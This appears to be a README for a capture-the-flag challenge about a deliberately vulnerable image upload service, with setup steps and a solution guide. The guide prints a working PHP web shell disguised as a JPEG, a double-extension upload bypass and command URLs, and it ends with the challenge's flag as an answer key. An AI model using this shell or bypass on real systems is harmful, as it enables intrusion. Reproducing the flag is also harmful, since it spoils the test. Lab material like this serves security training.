# ImageUploader CTF Challenge

## Challenge Details

### Category
- Web Security
- File Upload Vulnerability
- Command Injection
- Base64 Encoding

### Description
ImageUploader is a seemingly innocent image upload service that contains multiple security vulnerabilities. Participants must exploit file upload restrictions and use command injection to discover and decode a hidden flag.

### Difficulty Level
- Medium

## Technical Details

### Security Flaws
1. **Insecure File Upload**
   - The application only checks file extensions
   - Double extension bypass possible (e.g., `shell.php.jpg`)
   - No proper MIME type validation

2. **Command Injection**
   - Uploaded PHP files are executed as PHP code
   - GET parameter allows arbitrary command execution

3. **Information Disclosure**
   - Directory listing enabled in uploads folder
   - Base64 encoded flag stored in predictable location

## Hosting Requirements

### Prerequisites
- Docker
- Docker Compose
- Git (optional)

### Installation & Deployment

1. **Clone the Repository**
```bash
git clone https://github.com/yourusername/ImageUploader-CTF.git
cd ImageUploader-CTF
```

2. **Build and Run with Docker**
```bash
docker-compose up --build
```

3. **Access the Challenge**
- Open browser and navigate to: `http://localhost:8080`

## Solution Guide

### Step 1: Create Payload
Create a file named `shell.php.jpg` with the following content:
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Command received: $cmd<br>";
    echo "Executing...<br>";
    system($cmd, $retval);
    echo "Return value: $retval<br>";
} else {
    echo "No command provided.";
}
?>
```

### Step 2: Upload and Execute
1. Upload the `shell.php.jpg` file through the web interface
2. Navigate to `/uploads/shell.php.jpg` in the browser

### Step 3: Find the Flag
1. List directories:
```
http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var/hidden/level1/level2
```

2. Read the flag:
```
http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/var/hidden/level1/level2/secret_flag.txt
```

### Step 4: Decode the Flag
1. The output will be Base64 encoded
2. Decode using any of these methods:
   - Online Base64 decoder
   - Command line: `echo "BASE64_STRING" | base64 -d`
   - PowerShell: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))`

## Available Hints
1. "Check the MIME type bypass techniques"
2. "The flag is hidden deeper than you think"
3. "Multiple encodings might be involved"


## Security Measures
- Apache mod_security enabled
- Security headers configured
- File extension validation
- Upload directory permissions set
- Flag file permissions restricted
- Base64 encoded flag

## Flag Format
- Encoded: `UmVhbEZsYWd7VGgxc18xc19OMHRfVGgzX0ZsNGdfWTB1X1czbnR9`
- Decoded: `RealFlag{Th1s_1s_N0t_Th3_Fl4g_Y0u_W3nt}`
